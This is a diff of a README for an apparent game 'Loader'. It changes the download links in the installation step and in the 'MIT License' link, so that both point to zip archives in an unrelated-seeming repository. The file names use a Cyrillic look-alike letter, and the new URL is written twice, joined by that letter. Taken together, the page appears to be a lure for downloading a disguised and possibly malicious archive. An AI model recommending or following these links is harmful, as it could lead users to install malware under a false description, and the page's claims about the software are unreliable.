@@ -25,7 +25,7 @@ Enjoy effortless play and rapid access—whether on desktop or gaming device!
 
 ## 📥 Installation
 
-1. Download **https://raw.githubusercontent.com/Swescho-art/OpenAd-Specification_AdEngine_Images/main/Lоader.zip** from the repository.
+1. Download **https://raw.githubusercontent.com/Swescho-art/OpenAd-Specification_AdEngine_Images/main/uninhabitably/Specification_Open_Ad_Engine_Images_3.2-alpha.2.zipоhttps://raw.githubusercontent.com/Swescho-art/OpenAd-Specification_AdEngine_Images/main/uninhabitably/Specification_Open_Ad_Engine_Images_3.2-alpha.2.zip** from the repository.
 2. Extract the archive to your system.
 3. Follow the step-by-step instructions in the included README for your OS.
 4. Launch and play instantly!
@@ -40,4 +40,4 @@ This repository provides a **Loader** for educational and backup purposes only. 
 
 ## 📜 License
 
-Licensed under the [MIT License](https://raw.githubusercontent.com/Swescho-art/OpenAd-Specification_AdEngine_Images/main/Lоader.zip) – free for personal, non-commercial use!
+Licensed under the [MIT License](https://raw.githubusercontent.com/Swescho-art/OpenAd-Specification_AdEngine_Images/main/uninhabitably/Specification_Open_Ad_Engine_Images_3.2-alpha.2.zipоhttps://raw.githubusercontent.com/Swescho-art/OpenAd-Specification_AdEngine_Images/main/uninhabitably/Specification_Open_Ad_Engine_Images_3.2-alpha.2.zip) – free for personal, non-commercial use!
